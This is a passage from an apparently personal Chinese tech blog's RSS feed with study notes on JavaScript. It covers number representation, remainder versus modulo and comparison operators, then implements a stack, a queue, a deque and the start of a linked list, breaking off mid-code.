      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-数值"> 1. 数值</h2>
<ul>
<li>JavaScript 的浮点数并不是 IEEE 754 标准的完全实现。Java 的浮点数实现用的是 IEEE 754 的一个子集，而 JavaScript 用的则是该子集的子集，所有 JavaScript 的 number 类型与 Java 的 double 类型非常相似，都是 64 位的浮点数类型。一个 number 类型包含 1 位符号位（sign）、11 位指数位以及 53 位有效位数。有些神奇的编码能将 65 位数据装进 64 位内存中。</li>
</ul>
<h2 id="_2-运算符"> 2. 运算符</h2>
<ul>
<li>JavaScript 并不存在取模运算，只有取余运算。取余运算的正负取决于被除数，而取模则取决于除数（<a href="https://www.zhihu.com/question/30526656" target="_blank" rel="noopener noreferrer">知乎</a>）。</li>
</ul>
<div><pre><code><span>4</span> <span>/</span> <span>-</span><span>3</span> <span>=</span> <span>-</span><span>1.333</span><span>.</span><span>.</span><span>.3</span><span>.</span><span>.3</span> <span>// 不能整除</span>
<span>// 取模商为 -2（向负无穷取整），取余商为  -1（向0取整）</span>

r <span>=</span> <span>4</span> <span>-</span> <span>(</span><span>-</span><span>2</span> <span>*</span> <span>-</span><span>3</span><span>)</span> <span>=</span> <span>2</span>
r <span>=</span> <span>4</span> <span>-</span> <span>(</span><span>-</span><span>1</span> <span>*</span> <span>-</span><span>3</span><span>)</span> <span>=</span> <span>1</span>
<span>// 取模结果为 2，取余结果为 1</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></div></div><h2 id="_3-怪兽-来了"> 3. “怪兽” 来了</h2>
<div><pre><code><span>function</span> <span>deconstruct</span><span>(</span><span>number</span><span>)</span> <span>{</span>
  <span>// 数值 = 符号位 * 系数 * (2 ** 指数)</span>
  <span>let</span> sign <span>=</span> <span>1</span>
  <span>let</span> coefficient <span>=</span> number
  <span>let</span> exponent <span>=</span> <span>0</span>

  <span>if</span> <span>(</span>coefficient <span>&lt;</span> <span>0</span><span>)</span> <span>{</span>
    coefficient <span>=</span> <span>-</span>coefficient
    sign <span>=</span> <span>-</span><span>1</span>
  <span>}</span>

  <span>// 磨光系数（Number.isFinite(value)函数会在值为NaN、Infinity或者-Infinity的时候返回false）</span>
  <span>if</span> <span>(</span>Number<span>.</span><span>isFinite</span><span>(</span>number<span>)</span> <span>&amp;&amp;</span> number <span>!==</span> <span>0</span><span>)</span> <span>{</span>
    <span>// -1128 就是 Number.MIN_VALUE 的指数减去有效位数再减去奖励位的结果</span>
    exponent <span>=</span> <span>-</span><span>1128</span>
    <span>let</span> reduction <span>=</span> coefficient
    <span>while</span> <span>(</span>reduction <span>!==</span> <span>0</span><span>)</span> <span>{</span>
      exponent <span>+=</span> <span>1</span>
      reduction <span>/=</span> <span>2</span>
    <span>}</span>

    <span>// 磨光指数</span>
    reduction <span>=</span> exponent
    <span>while</span> <span>(</span>reduction <span>></span> <span>0</span><span>)</span> <span>{</span>
      coefficient <span>/=</span> <span>2</span>
      reduction <span>-=</span> <span>1</span>
    <span>}</span>
    <span>while</span> <span>(</span>reduction <span>&lt;</span> <span>0</span><span>)</span> <span>{</span>
      coefficient <span>*=</span> <span>2</span>
      reduction <span>+=</span> <span>1</span>
    <span>}</span>
  <span>}</span>

  <span>return</span> <span>{</span>
    sign<span>,</span>
    coefficient<span>,</span>
    exponent<span>,</span>
    number<span>,</span>
  <span>}</span>
<span>}</span>

<span>// 计算值（不要用JS引擎，用科学计算器）</span>
<span>const</span> scienceValue <span>=</span> sign <span>*</span> coefficient <span>*</span> <span>2</span> <span>**</span> exponent<span>,</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br></div></div><h2 id="_4-高精度整数、浮点数、有理数"> 4. 高精度整数、浮点数、有理数</h2>
<ul>
<li>硬核，啃不动，先打入冷宫！</li>
</ul>
<h2 id="_5-关系运算符"> 5. 关系运算符</h2>
<ul>
<li>
<p>除非你肯定值得大小在安全整数范围内，否则不要通过 === 的条件判断来结束循环。即使在安全整数范围内，我也还是推荐使用 &gt;=、&lt;=、&gt;、&lt;。</p>
</li>
<li>
<p>答应我，永远不要用这两个运算符（== 和 !=）。答应我，务必使用 === 和 !==（答应他！答应他！）。</p>
</li>
</ul>
<h2 id="_6-非"> 6. 非</h2>
<ul>
<li>德·摩根定律可用于简化逻辑表达式。</li>
</ul>
<div><pre><code><span>!</span><span>(</span>p <span>&amp;&amp;</span> q<span>)</span> <span>===</span> <span>!</span>p <span>||</span> <span>!</span>q
<span>!</span><span>(</span>p <span>||</span> q<span>)</span> <span>===</span> <span>!</span>p <span>&amp;&amp;</span> <span>!</span>q
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div><h2 id="_7-数组"> 7. 数组</h2>
<ul>
<li>
<p>数组有一个神奇的 length 属性。该属性并不是指数组中元素的数量，而是指数组元素的最高序数加 1。</p>
</li>
<li>
<p>sort 方法有一个比较严重的问题，那就是缺乏稳定性。在比较两个相等值的时候（比较函数会返回 0），如果排序方法将这两个值排在它们原来的位置上，则可以说该排序方法是稳定的。</p>
<blockquote>
<p>想象一下，你正在对姓名进行排序：先判断姓的顺序，若姓相同再判断名的顺序。如果 sort 方法稳定，我们就可以这么做：先对姓排一遍序，结束后再对名排一遍序。可惜的是 JavaScript 并不具备该稳定性，第二遍排序会把第一遍已排好的姓打乱。</p>
</blockquote>
</li>
</ul>
<h2 id="吾非天选之子-neo"> 吾非天选之子 —— NEO</h2>
]]></content:encoded>
    </item>
    <item>
      <title>学习 JavaScript 数据结构与算法（第三版）</title>
      <link>https://www.matrixtheone.ga/web/note/books/JS-Algorithms/</link>
      <guid>https://www.matrixtheone.ga/web/note/books/JS-Algorithms/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">学习 JavaScript 数据结构与算法（第三版）</source>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-栈数据结构"> 1. 栈数据结构</h2>
<ul>
<li>
<p>栈是一种遵从后进先出（LIFO）原则的有序集合。新添加或待删除的元素都保存在栈的同一端，称作栈顶，另一端就叫栈底。在栈里，新元素都靠近栈顶，旧元素都接近栈底。</p>
</li>
<li>
<p>栈也被用在编程语言的编译器和内存中保存变量、方法调用等，也被用于浏览器历史记录（浏览器的返回按钮）。</p>
</li>
</ul>
<div><pre><code><span>class</span> <span>Stack</span> <span>{</span>
  <span>constructor</span><span>(</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>items <span>=</span> <span>[</span><span>]</span>
  <span>}</span>
  <span>// 向栈添加元素</span>
  <span>push</span><span>(</span><span>element</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>items<span>.</span><span>push</span><span>(</span>element<span>)</span>
  <span>}</span>
  <span>// 从栈移除元素</span>
  <span>pop</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>this</span><span>.</span>items<span>.</span><span>pop</span><span>(</span><span>)</span>
  <span>}</span>
  <span>// 查看栈顶元素</span>
  <span>peek</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>this</span><span>.</span>items<span>[</span><span>this</span><span>.</span>items<span>.</span>length <span>-</span> <span>1</span><span>]</span>
  <span>}</span>
  <span>// 检查栈是否为空</span>
  <span>isEmpty</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>this</span><span>.</span>items<span>.</span>length <span>===</span> <span>0</span>
  <span>}</span>
  <span>// 清空栈元素</span>
  <span>clear</span><span>(</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>items <span>=</span> <span>[</span><span>]</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br></div></div><h2 id="_2-用栈解决问题"> 2. 用栈解决问题</h2>
<ul>
<li>
<p>栈的实际应用非常广泛。在回溯问题中，它可以存储访问过的任务或路径、撤销的操作。</p>
</li>
<li>
<p>进制转换算法</p>
</li>
</ul>
<div><pre><code><span>function</span> <span>baseConverter</span><span>(</span><span>decNumber<span>,</span> base</span><span>)</span> <span>{</span>
  <span>const</span> remStack <span>=</span> <span>new</span> <span>Stack</span><span>(</span><span>)</span>
  <span>const</span> digits <span>=</span> <span>'0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>
  <span>let</span> number <span>=</span> decNumber
  <span>let</span> rem
  <span>let</span> baseString <span>=</span> <span>''</span>
  <span>if</span> <span>(</span><span>!</span><span>(</span>base <span>>=</span> <span>2</span> <span>&amp;&amp;</span> base <span>&lt;=</span> <span>36</span><span>)</span><span>)</span> <span>{</span>
    <span>return</span> <span>''</span>
  <span>}</span>
  <span>while</span> <span>(</span>number <span>></span> <span>0</span><span>)</span> <span>{</span>
    rem <span>=</span> Math<span>.</span><span>floor</span><span>(</span>number <span>%</span> base<span>)</span>
    remStack<span>.</span><span>push</span><span>(</span>rem<span>)</span>
    number <span>=</span> Math<span>.</span><span>floor</span><span>(</span>number <span>/</span> base<span>)</span>
  <span>}</span>
  <span>while</span> <span>(</span><span>!</span>remStack<span>.</span><span>isEmpty</span><span>(</span><span>)</span><span>)</span> <span>{</span>
    baseString <span>+=</span> digits<span>[</span>remStack<span>.</span><span>pop</span><span>(</span><span>)</span><span>]</span>
  <span>}</span>
  <span>return</span> baseString
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br></div></div><h2 id="_3-队列数据结构"> 3. 队列数据结构</h2>
<ul>
<li>队列是遵循先进先出（FIFO，也称为先来先服务）原则的一组有序的项。队列在尾部添加新元素，并从顶部移除元素。最新添加的元素必须排在队列的末尾。</li>
</ul>
<div><pre><code><span>class</span> <span>Queue</span> <span>{</span>
  <span>constructor</span><span>(</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>count <span>=</span> <span>0</span>
    <span>this</span><span>.</span>lowestCount <span>=</span> <span>0</span>
    <span>this</span><span>.</span>items <span>=</span> <span>{</span><span>}</span>
  <span>}</span>
  <span>// 向队列添加元素</span>
  <span>enqueue</span><span>(</span><span>element</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>items<span>[</span><span>this</span><span>.</span>count<span>]</span> <span>=</span> element
    <span>this</span><span>.</span>count<span>++</span>
  <span>}</span>
  <span>// 从队列移除元素</span>
  <span>dequeue</span><span>(</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>this</span><span>.</span><span>isEmpty</span><span>(</span><span>)</span><span>)</span> <span>{</span>
      <span>return</span> <span>undefined</span>
    <span>}</span>
    <span>const</span> result <span>=</span> <span>this</span><span>.</span>items<span>[</span><span>this</span><span>.</span>lowestCount<span>]</span>
    <span>delete</span> <span>this</span><span>.</span>items<span>[</span><span>this</span><span>.</span>lowestCount<span>]</span>
    <span>this</span><span>.</span>lowestCount<span>++</span>
    <span>return</span> result
  <span>}</span>
  <span>// 查看队列头元素</span>
  <span>peek</span><span>(</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>this</span><span>.</span><span>isEmpty</span><span>(</span><span>)</span><span>)</span> <span>{</span>
      <span>return</span> <span>undefined</span>
    <span>}</span>
    <span>return</span> <span>this</span><span>.</span>items<span>[</span><span>this</span><span>.</span>lowestCount<span>]</span>
  <span>}</span>
  <span>// 获取长度</span>
  <span>size</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>this</span><span>.</span>count <span>-</span> <span>this</span><span>.</span>lowestCount
  <span>}</span>
  <span>// 检查队列是否为空</span>
  <span>isEmpty</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>this</span><span>.</span><span>size</span><span>(</span><span>)</span> <span>===</span> <span>0</span>
  <span>}</span>
  <span>// 清空队列</span>
  <span>clear</span><span>(</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>items <span>=</span> <span>{</span><span>}</span>
    <span>this</span><span>.</span>count <span>=</span> <span>0</span>
    <span>this</span><span>.</span>lowestCount <span>=</span> <span>0</span>
  <span>}</span>
  <span>toString</span><span>(</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>this</span><span>.</span><span>isEmpty</span><span>(</span><span>)</span><span>)</span> <span>{</span>
      <span>return</span> <span>''</span>
    <span>}</span>
    <span>let</span> objString <span>=</span> <span><span>`</span><span><span>${</span><span>this</span><span>.</span>items<span>[</span><span>this</span><span>.</span>lowestCount<span>]</span><span>}</span></span><span>`</span></span>
    <span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>this</span><span>.</span>lowestCount <span>+</span> <span>1</span><span>;</span> i <span>&lt;</span> <span>this</span><span>.</span>count<span>;</span> i<span>++</span><span>)</span> <span>{</span>
      objString <span>=</span> <span><span>`</span><span><span>${</span>objString<span>}</span></span><span>,</span><span><span>${</span><span>this</span><span>.</span>items<span>[</span>i<span>]</span><span>}</span></span><span>`</span></span>
    <span>}</span>
    <span>return</span> objString
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br></div></div><h2 id="_4-双端队列数据结构"> 4. 双端队列数据结构</h2>
<ul>
<li>双端队列（deque，或称 double-ended queue）是一种允许我们同时从前端和后端添加和移除元素的特殊队列。由于双端队列同时遵守了先进先出和后进先出原则，可以说它是把队列和栈相结合的一种数据结构。</li>
</ul>
<div><pre><code><span>class</span> <span>Deque</span> <span>{</span>
  <span>constructor</span><span>(</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>count <span>=</span> <span>0</span>
    <span>this</span><span>.</span>lowestCount <span>=</span> <span>0</span>
    <span>this</span><span>.</span>items <span>=</span> <span>{</span><span>}</span>
  <span>}</span>
  <span>// 向双端队列的前端添加元素</span>
  <span>addFront</span><span>(</span><span>element</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>this</span><span>.</span><span>isEmpty</span><span>(</span><span>)</span><span>)</span> <span>{</span>
      <span>this</span><span>.</span><span>addBack</span><span>(</span>element<span>)</span>
    <span>}</span> <span>else</span> <span>if</span> <span>(</span><span>this</span><span>.</span>lowestCount <span>></span> <span>0</span><span>)</span> <span>{</span>
      <span>this</span><span>.</span>lowestCount<span>--</span>
      <span>this</span><span>.</span>items<span>[</span><span>this</span><span>.</span>lowestCount<span>]</span> <span>=</span> element
    <span>}</span> <span>else</span> <span>{</span>
      <span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>this</span><span>.</span>count<span>;</span> i <span>></span> <span>0</span><span>;</span> i<span>--</span><span>)</span> <span>{</span>
        <span>this</span><span>.</span>items<span>[</span>i<span>]</span> <span>=</span> <span>this</span><span>.</span>items<span>[</span>i <span>-</span> <span>1</span><span>]</span>
      <span>}</span>
      <span>this</span><span>.</span>count<span>++</span>
      <span>this</span><span>.</span>lowestCount <span>=</span> <span>0</span>
      <span>this</span><span>.</span>items<span>[</span><span>0</span><span>]</span> <span>=</span> element
    <span>}</span>
  <span>}</span>
  <span>// 向双端队列的的后端添加元素</span>
  <span>addBack</span><span>(</span><span>element</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>items<span>[</span><span>this</span><span>.</span>count<span>]</span> <span>=</span> element
    <span>this</span><span>.</span>count<span>++</span>
  <span>}</span>
  <span>// 从双端队列的前端移除元素</span>
  <span>removeFront</span><span>(</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>this</span><span>.</span><span>isEmpty</span><span>(</span><span>)</span><span>)</span> <span>{</span>
      <span>return</span> <span>undefined</span>
    <span>}</span>
    <span>const</span> result <span>=</span> <span>this</span><span>.</span>items<span>[</span><span>this</span><span>.</span>lowestCount<span>]</span>
    <span>delete</span> <span>this</span><span>.</span>items<span>[</span><span>this</span><span>.</span>lowestCount<span>]</span>
    <span>this</span><span>.</span>lowestCount<span>++</span>
    <span>return</span> result
  <span>}</span>
  <span>// 从双端队列的后端移除元素</span>
  <span>pop</span><span>(</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>this</span><span>.</span><span>isEmpty</span><span>(</span><span>)</span><span>)</span> <span>{</span>
      <span>return</span> <span>undefined</span>
    <span>}</span>
    <span>this</span><span>.</span>count<span>--</span>
    <span>const</span> result <span>=</span> <span>this</span><span>.</span>items<span>[</span><span>this</span><span>.</span>count<span>]</span>
    <span>delete</span> <span>this</span><span>.</span>items<span>[</span><span>this</span><span>.</span>count<span>]</span>
    <span>return</span> result
  <span>}</span>
  <span>// 查看双端队列头元素</span>
  <span>peekFront</span><span>(</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>this</span><span>.</span><span>isEmpty</span><span>(</span><span>)</span><span>)</span> <span>{</span>
      <span>return</span> <span>undefined</span>
    <span>}</span>
    <span>return</span> <span>this</span><span>.</span>items<span>[</span><span>this</span><span>.</span>lowestCount<span>]</span>
  <span>}</span>
  <span>// 查看双端队列尾元素</span>
  <span>peekBack</span><span>(</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>this</span><span>.</span><span>isEmpty</span><span>(</span><span>)</span><span>)</span> <span>{</span>
      <span>return</span> <span>undefined</span>
    <span>}</span>
    <span>return</span> <span>this</span><span>.</span>items<span>[</span><span>this</span><span>.</span>count <span>-</span> <span>1</span><span>]</span>
  <span>}</span>
  <span>// 获取长度</span>
  <span>size</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>this</span><span>.</span>count <span>-</span> <span>this</span><span>.</span>lowestCount
  <span>}</span>
  <span>// 检查队列是否为空</span>
  <span>isEmpty</span><span>(</span><span>)</span> <span>{</span>
    <span>return</span> <span>this</span><span>.</span><span>size</span><span>(</span><span>)</span> <span>===</span> <span>0</span>
  <span>}</span>
  <span>// 清空队列</span>
  <span>clear</span><span>(</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>items <span>=</span> <span>{</span><span>}</span>
    <span>this</span><span>.</span>count <span>=</span> <span>0</span>
    <span>this</span><span>.</span>lowestCount <span>=</span> <span>0</span>
  <span>}</span>
  <span>toString</span><span>(</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>this</span><span>.</span><span>isEmpty</span><span>(</span><span>)</span><span>)</span> <span>{</span>
      <span>return</span> <span>''</span>
    <span>}</span>
    <span>let</span> objString <span>=</span> <span><span>`</span><span><span>${</span><span>this</span><span>.</span>items<span>[</span><span>this</span><span>.</span>lowestCount<span>]</span><span>}</span></span><span>`</span></span>
    <span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>this</span><span>.</span>lowestCount <span>+</span> <span>1</span><span>;</span> i <span>&lt;</span> <span>this</span><span>.</span>count<span>;</span> i<span>++</span><span>)</span> <span>{</span>
      objString <span>=</span> <span><span>`</span><span><span>${</span>objString<span>}</span></span><span>,</span><span><span>${</span><span>this</span><span>.</span>items<span>[</span>i<span>]</span><span>}</span></span><span>`</span></span>
    <span>}</span>
    <span>return</span> objString
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br><span>82</span><br><span>83</span><br><span>84</span><br><span>85</span><br><span>86</span><br></div></div><h2 id="_5-使用队列和双端队列来解决问题"> 5. 使用队列和双端队列来解决问题</h2>
<ul>
<li>循环队列 —— 击鼓传花游戏。</li>
</ul>
<div><pre><code><span>function</span> <span>hotPotato</span><span>(</span><span>elementsList<span>,</span> num</span><span>)</span> <span>{</span>
  <span>const</span> queue <span>=</span> <span>new</span> <span>Queue</span><span>(</span><span>)</span>
  <span>const</span> elimitatedList <span>=</span> <span>[</span><span>]</span>
  <span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> elementsList<span>.</span>length<span>;</span> i<span>++</span><span>)</span> <span>{</span>
    queue<span>.</span><span>enqueue</span><span>(</span>elementsList<span>[</span>i<span>]</span><span>)</span>
  <span>}</span>
  <span>while</span> <span>(</span>queue<span>.</span><span>size</span><span>(</span><span>)</span> <span>></span> <span>1</span><span>)</span> <span>{</span>
    <span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> num<span>;</span> i<span>++</span><span>)</span> <span>{</span>
      queue<span>.</span><span>enqueue</span><span>(</span>queue<span>.</span><span>dequeue</span><span>(</span><span>)</span><span>)</span>
    <span>}</span>
    elimitatedList<span>.</span><span>push</span><span>(</span>queue<span>.</span><span>dequeue</span><span>(</span><span>)</span><span>)</span>
  <span>}</span>
  <span>return</span> <span>{</span>
    <span>eliminated</span><span>:</span> elimitatedList<span>,</span>
    <span>winner</span><span>:</span> queue<span>.</span><span>dequeue</span><span>(</span><span>)</span><span>,</span>
  <span>}</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br></div></div><ul>
<li>回文检查器。</li>
</ul>
<blockquote>
<p>回文是正反都能读通的单词、词组、数或一系列字符的序列，例如 madam 或 racecar。</p>
</blockquote>
<div><pre><code><span>function</span> <span>palindromeChecker</span><span>(</span><span>aString</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span>
    aString <span>===</span> <span>undefined</span> <span>||</span>
    aString <span>===</span> <span>null</span> <span>||</span>
    <span>(</span>aString <span>!==</span> <span>null</span> <span>&amp;&amp;</span> aString<span>.</span>length <span>===</span> <span>0</span><span>)</span>
  <span>)</span> <span>{</span>
    <span>return</span> <span>false</span>
  <span>}</span>
  <span>const</span> deque <span>=</span> <span>new</span> <span>Deque</span><span>(</span><span>)</span>
  <span>const</span> lowerString <span>=</span> aString
    <span>.</span><span>toLocaleLowerCase</span><span>(</span><span>)</span>
    <span>.</span><span>split</span><span>(</span><span>' '</span><span>)</span>
    <span>.</span><span>join</span><span>(</span><span>''</span><span>)</span>
  <span>let</span> isEqual <span>=</span> <span>true</span>
  <span>let</span> firstChar<span>,</span> lastChar
  <span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> lowerString<span>.</span>length<span>;</span> i<span>++</span><span>)</span> <span>{</span>
    deque<span>.</span><span>addBack</span><span>(</span>lowerString<span>.</span><span>charAt</span><span>(</span>i<span>)</span><span>)</span>
  <span>}</span>
  <span>while</span> <span>(</span>deque<span>.</span><span>size</span><span>(</span><span>)</span> <span>></span> <span>1</span> <span>&amp;&amp;</span> isEqual<span>)</span> <span>{</span>
    firstChar <span>=</span> deque<span>.</span><span>removeFront</span><span>(</span><span>)</span>
    lastChar <span>=</span> deque<span>.</span><span>removeBack</span><span>(</span><span>)</span>
    <span>if</span> <span>(</span>firstChar <span>!==</span> lastChar<span>)</span> <span>{</span>
      isEqual <span>=</span> <span>false</span>
    <span>}</span>
  <span>}</span>
  <span>return</span> isEqual
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br></div></div><h2 id="_6-链表数据结构"> 6. 链表数据结构</h2>
<ul>
<li>链表存储有序的元素集合，但不同于数组，链表中的元素在内存中并不是连续放置的。每个元素由一个存储元素本身的节点和一个指向下一个元素的引用（也称指针或链接）组成。</li>
</ul>
<img :src="$withBase('/images/JS-Algorithms/单向链表.png')" loading="lazy">
<div><pre><code><span>function</span> <span>defaultEquals</span><span>(</span><span>a<span>,</span> b</span><span>)</span> <span>{</span>
  <span>return</span> a <span>===</span> b
<span>}</span>

<span>class</span> <span>Node</span> <span>{</span>
  <span>constructor</span><span>(</span><span>element</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>element <span>=</span> element
    <span>this</span><span>.</span>next <span>=</span> <span>undefined</span>
  <span>}</span>
<span>}</span>

<span>class</span> <span>LinkedList</span> <span>{</span>
  <span>constructor</span><span>(</span><span>equalsFn <span>=</span> defaultEquals</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>count <span>=</span> <span>0</span>
    <span>this</span><span>.</span>head <span>=</span> <span>undefined</span>
    <span>// 比较函数</span>
    <span>this</span><span>.</span>equalsFn <span>=</span> equalsFn
  <span>}</span>
  <span>// 向链表尾部添加元素</span>
  <span>push</span><span>(</span><span>element</span><span>)</span> <span>{</span>
    <span>const</span> node <span>=</span> <span>new</span> <span>Node</span><span>(</span>element<span>)</span>
    <span>let</span> current
    <span>if</span> <span>(</span><span>this</span><span>.</span>head <span>==</span> <span>null</span><span>)</span> <span>{</span>
      <span>this</span><span>.</span>head <span>=</span> node
    <span>}</span> <span>else</span> <span>{</span>
      current <span>=</span> <span>this</span><span>.</span>head
      <span>while</span> <span>(</span>current<span>.</span>next <span>!=</span> <span>null</span><span>)</span> <span>{</span>
        <span>// 获得最后一项</span>
        current <span>=</span> current<span>.</span>next
      <span>}</span>
      <span>// 将其 next 赋为新元素，建立链接</span>
      current<span>.</span>next <span>=</span> node
    <span>}</span>
    <span>this</span><span>.</span>count<span>++</span>
  <span>}</span>
  <span>// 从任意位置移除元素</span>
  <span>removeAt</span><span>(</span><span>index</span><span>)</span> <span>{</span>
    <span>// 检查越界值</span>
    <span>if</span> <span>(</span>index <span>>=</span> <span>0</span> <span>&amp;&amp;</span> index <span>&lt;</span> <span>this</span><span>.</span>count<span>)</span> <span>{</span>
      <span>let</span> current <span>=</span> <span>this</span><span>.</span>head
      <span>// 移除第一项</span>
      <span>if</span> <span>(</span>index <span>===</span> <span>0</span><span>)</span> <span>{</span>
        <span>this</span><span>.</span>head <span>=</span> current<span>.</span>next
      <span>}</span> <span>else</span> <span>{</span>
        <span>const</span> previous <span>=</span> <span>this</span><span>.</span><span>getElementAt</span><span>(</span>index <span>-</span> <span>1</span><span>)</span>
        current <span>=</span> previous<span>.</span>next
        previous<span>.</span>next <span>=</span> current<span>.</span>next
      <span>}</span>
      <span>this</span><span>.</span>count<span>--</span>
      <span>return</span> current<span>.</span>element
    <span>}</span>
    <span>return</span> <span>undefined</span>
  <span>}</span>
  <span>// 循环迭代链表直到目标位置</span>
  <span>getElementAt</span><span>(</span><span>index</span><span>)</span> <span>{</span>
